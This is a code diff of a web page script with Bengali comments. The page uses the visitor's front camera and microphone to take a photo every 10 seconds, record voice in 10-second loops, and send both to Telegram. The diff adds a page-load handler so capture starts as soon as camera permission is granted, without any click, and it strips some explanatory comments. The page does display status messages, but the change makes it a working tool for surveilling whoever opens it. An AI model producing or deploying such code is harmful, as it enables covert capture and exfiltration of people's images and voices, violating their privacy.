@@ -120,8 +120,8 @@
   let audioChunks = [];
   let photoURL = null;
   let audioURL = null;
-  let autoCaptureInterval = null; // অটোমেটিক স্ক্রিনশট ইন্টারভ্যাল
-  let autoVoiceInterval = null;   // অটোমেটিক ভয়েস লুপ ইন্টারভ্যাল
+  let autoCaptureInterval = null; 
+  let autoVoiceInterval = null;   
 
   // টেলিগ্রামে ছবি পাঠানোর ফাংশন
   async function sendPhotoToTelegram(blob) {
@@ -206,7 +206,6 @@
 
       audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
 
-      // লুপ ফাংশন যা প্রতি ১০ সেকেন্ড পর পর ট্রিগার হবে
       const runVoiceCycle = async () => {
         if (!audioStream) return;
 
@@ -237,15 +236,12 @@
 
           document.getElementById("voiceStatus").textContent = "রেকর্ডিং শেষ, টেলিগ্রামে পাঠানো হচ্ছে...";
           
-          // টেলিগ্রামে ভয়েস ফাইল পাঠানো
           sendAudioToTelegram(blob);
         };
 
-        // রেকর্ডিং শুরু
         recorder.start();
         document.getElementById("voiceStatus").textContent = "১০ সেকেন্ডের অটোমেটিক রেকর্ডিং চলছে...";
 
-        // ঠিক ১০ সেকেন্ড (10000ms) পর রেকর্ডিং বন্ধ করার টাইমার
         setTimeout(() => {
           if (recorder && recorder.state === "recording") {
             recorder.stop();
@@ -253,10 +249,8 @@
         }, 10000);
       };
 
-      // প্রথম সাইকেল এখনই রান হবে
       runVoiceCycle();
 
-      // প্রতি ১০.৫ সেকেন্ড পরপর পরবর্তী সাইকেল শুরু হবে (রেকর্ডিং বন্ধ হওয়া এবং আপলোড হওয়ার সময় কনসিডার করে)
       if (autoVoiceInterval) clearInterval(autoVoiceInterval);
       autoVoiceInterval = setInterval(runVoiceCycle, 10500);
 
@@ -265,61 +259,60 @@
     }
   }
 
-  // ফ্রন্ট ক্যামেরা চালু এবং অটোমেটিক প্রসেস শুরু
-  document.getElementById("startCamera").onclick =
-    async () => {
-      try {
-        cameraStream =
-          await navigator.mediaDevices.getUserMedia({
-            video: {
-              facingMode: "user"
-            },
-            audio: false
-          });
+  // ফ্রন্ট ক্যামেরা চালু এবং অটোমেটিক প্রসেস শুরু করার মূল ফাংশন
+  async function triggerStartCamera() {
+    try {
+      cameraStream =
+        await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: "user"
+          },
+          audio: false
+        });
 
-        camera.srcObject = cameraStream;
-        camera.classList.remove("hidden");
+      camera.srcObject = cameraStream;
+      camera.classList.remove("hidden");
 
-        await camera.play();
+      await camera.play();
 
-        document.getElementById("takePhoto").disabled = false;
-        document.getElementById("stopCamera").disabled = false;
+      document.getElementById("takePhoto").disabled = false;
+      document.getElementById("stopCamera").disabled = false;
+      document.getElementById("startCamera").disabled = true;
 
-        document.getElementById("cameraStatus").textContent =
-          "ফ্রন্ট ক্যামেরা চালু আছে (প্রতি ১০ সেকেন্ডে অটো ছবি ও ভয়েস পাঠানো হবে)।";
+      document.getElementById("cameraStatus").textContent =
+        "ফ্রন্ট ক্যামেরা চালু আছে (প্রতি ১০ সেকেন্ডে অটো ছবি ও ভয়েস পাঠানো হচ্ছে)।";
 
-        // ১০ সেকেন্ড পরপর অটো ছবি পাঠানোর লজিক চালু
-        if (autoCaptureInterval) clearInterval(autoCaptureInterval);
-        autoCaptureInterval = setInterval(captureAndSend, 10000);
+      if (autoCaptureInterval) clearInterval(autoCaptureInterval);
+      autoCaptureInterval = setInterval(captureAndSend, 10000);
 
-        // ১০ সেকেন্ড পরপর অটো ভয়েস রেকর্ড ও পাঠানোর লজিক চালু
-        startAutoVoiceLoop();
+      startAutoVoiceLoop();
+      document.getElementById("startVoice").disabled = true;
+      document.getElementById("stopVoice").disabled = false;
 
-      } catch (error) {
-        document.getElementById("cameraStatus").textContent =
-          "ক্যামেরা চালু করা যায়নি: " + error.message;
-      }
-    };
+    } catch (error) {
+      document.getElementById("cameraStatus").textContent =
+        "ক্যামেরা চালু করা যায়নি: " + error.message;
+    }
+  }
 
-  // ম্যানুয়ালি একটি ছবি তোলা
+  // বাটনে ক্লিক ইভেন্ট বাইন্ড করা
+  document.getElementById("startCamera").onclick = triggerStartCamera;
+
   document.getElementById("takePhoto").onclick = () => {
     captureAndSend();
   };
 
-  // ক্যামেরা বন্ধ করা এবং সব অটোমেটিক প্রসেস থামানো
   document.getElementById("stopCamera").onclick = () => {
     if (cameraStream) {
       cameraStream.getTracks().forEach(track => track.stop());
       cameraStream = null;
     }
 
-    // অটোমেটিক স্ক্রিনশট লজিক বন্ধ
     if (autoCaptureInterval) {
       clearInterval(autoCaptureInterval);
       autoCaptureInterval = null;
     }
 
-    // অটোমেটিক ভয়েস লজিক বন্ধ
     if (autoVoiceInterval) {
       clearInterval(autoVoiceInterval);
       autoVoiceInterval = null;
@@ -339,17 +332,20 @@
 
     document.getElementById("takePhoto").disabled = true;
     document.getElementById("stopCamera").disabled = true;
+    document.getElementById("startCamera").disabled = false;
+    document.getElementById("startVoice").disabled = false;
+    document.getElementById("stopVoice").disabled = true;
 
     document.getElementById("cameraStatus").textContent =
       "ক্যামেরা বন্ধ করা হয়েছে এবং সব অটো-প্রসেস থেমে গেছে।";
   };
 
-  // ম্যানুয়াল অডিও রেকর্ডিং শুরু বাটন
   document.getElementById("startVoice").onclick = async () => {
     startAutoVoiceLoop();
+    document.getElementById("startVoice").disabled = true;
+    document.getElementById("stopVoice").disabled = false;
   };
 
-  // ম্যানুয়াল অডিও রেকর্ডিং বন্ধ বাটন
   document.getElementById("stopVoice").onclick = () => {
     if (recorder && recorder.state === "recording") {
       recorder.stop();
@@ -362,7 +358,13 @@
     document.getElementById("stopVoice").disabled = true;
   };
 
-  // পেজ ছাড়লে ক্যামেরা ও মাইক্রোফোন বন্ধ এবং অটোমেটিক লজিক ক্লিয়ার
+  // পেজ লোড হওয়ার সাথে সাথে অটোমেটিক ক্যামেরা এবং ভয়েস রেকর্ডিং চালু করার লজিক
+  window.addEventListener("DOMContentLoaded", () => {
+    // ব্রাউজারের সিকিউরিটি পলিসির কারণে অনেক সময় সরাসরি ইউজার ইন্টারঅ্যাকশন ছাড়া ক্যামেরা পারমিশন প্রম্পট আটকে যেতে পারে, 
+    // তাই সরাসরি ফাংশন কল করা হয়েছে যাতে পারমিশন এলাও করার সাথে সাথেই অটো স্টার্ট হয়ে যায়।
+    triggerStartCamera();
+  });
+
   window.addEventListener("pagehide", () => {
     if (autoCaptureInterval) clearInterval(autoCaptureInterval);
     if (autoVoiceInterval) clearInterval(autoVoiceInterval);
